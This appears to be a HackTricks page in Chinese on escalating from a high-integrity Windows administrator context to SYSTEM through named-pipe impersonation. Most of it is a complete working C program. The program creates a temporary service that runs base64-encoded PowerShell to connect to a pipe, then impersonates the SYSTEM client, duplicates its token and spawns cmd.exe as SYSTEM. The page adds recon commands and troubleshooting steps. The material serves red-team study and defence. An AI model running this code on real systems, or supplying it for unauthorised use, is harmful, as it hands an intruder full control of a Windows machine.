# 从 High Integrity 到 SYSTEM：使用 Name Pipes

{{#include ../../banners/hacktricks-training.md}}

这是 named-pipe impersonation 的 **administrator/SCM variant**：一个 elevated process 创建临时 service，其 child 以 `SYSTEM` 身份连接，然后 impersonate 该 client。如果 starting context 无法创建 services 但具有 `SeImpersonatePrivilege`，请改用 privileged-service coercion；参见 [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) 和 [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md)。创建 service 需要对 SCM 的访问权限以及对新 service 的 `SERVICE_START` 访问权限，而 `CreateProcessWithTokenW` 需要 `SeImpersonatePrivilege`。<sup>[[2]](#references)[[3]](#references)</sup>

快速确认预期的 starting context：
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**代码流程：**

1. 在启动 service **之前**创建 named-pipe server。等待时，如果 `ConnectNamedPipe` 返回 `FALSE` 且错误为 `ERROR_PIPE_CONNECTED`，应将其视为成功：这表示 client 在 `CreateNamedPipe` 和 `ConnectNamedPipe` 之间赢得了竞争并已连接。<sup>[[4]](#references)</sup>
2. 创建并启动一个会连接到已创建 pipe 并写入内容的 service。该 service 代码将执行以下 encoded PS code：`$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. service 连接并写入后，调用 `ImpersonateNamedPipeClient`，打开生成的 thread token，并将其 duplicate 为 primary token。<sup>[[1]](#references)</sup>
4. 使用该 primary token spawn `cmd.exe`。<sup>[[2]](#references)</sup>

此路径假设 caller 能够创建/启动 service，并拥有 `CreateProcessWithTokenW` 所需的 privileges（通常为 `SeImpersonatePrivilege`）。这是一种从 high-integrity 提升到 SYSTEM 的 technique，并非任意 low-privileged user 都可使用的 primitive。<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> 如果 service 创建或启动失败，示例不会向 pipe thread 发出 signal，可能会无限期等待。在 lab 之外使用前，请添加 error handling 和 overlapped pipe timeout。同时使用随机的 pipe/service name，以避免冲突。

`ImpersonateNamedPipeClient` 会采用与**最后一次读取的 message**关联的 context，因此仅建立连接并不足够：让 privileged client 写入内容，确认 `ReadFile` 返回了数据，然后再进行 impersonate。使用 `SecurityImpersonation` 将 thread impersonation token duplicate 为 `TokenPrimary` token；process-creation API 使用的是 primary token。<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### 故障排查

- `ConnectNamedPipe == FALSE` 且返回 `ERROR_PIPE_CONNECTED`：继续执行；该 pipe 已经连接。<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` 返回 `ERROR_CANNOT_IMPERSONATE` (`1368`)：确认 SYSTEM client 确实写入了数据，并且 `ReadFile` 已完成。同时检查 client 请求的 impersonation level；处于 identification/anonymous-level 的 client 无法被完全 impersonate。<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` 返回 `ERROR_PRIVILEGE_NOT_HELD` (`1314`)：原始 caller 不持有 `SeImpersonatePrivilege`。在 high-integrity administrator context 中，使用 [SeImpersonate from High To System](seimpersonate-from-high-to-system.md) 中记录的 token-copy route，或者在 impersonating SYSTEM 时使用 `CreateProcessAsUserW`，前提是其所需的 privileges 已存在。<sup>[[2]](#references)</sup>
- `CreateServiceA` 返回 `ERROR_SERVICE_EXISTS` (`1073`)：删除残留的 `PiperSrv` entry，或将 `PIPESRV` 随机化；trigger 完成后务必删除 temporary service。<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
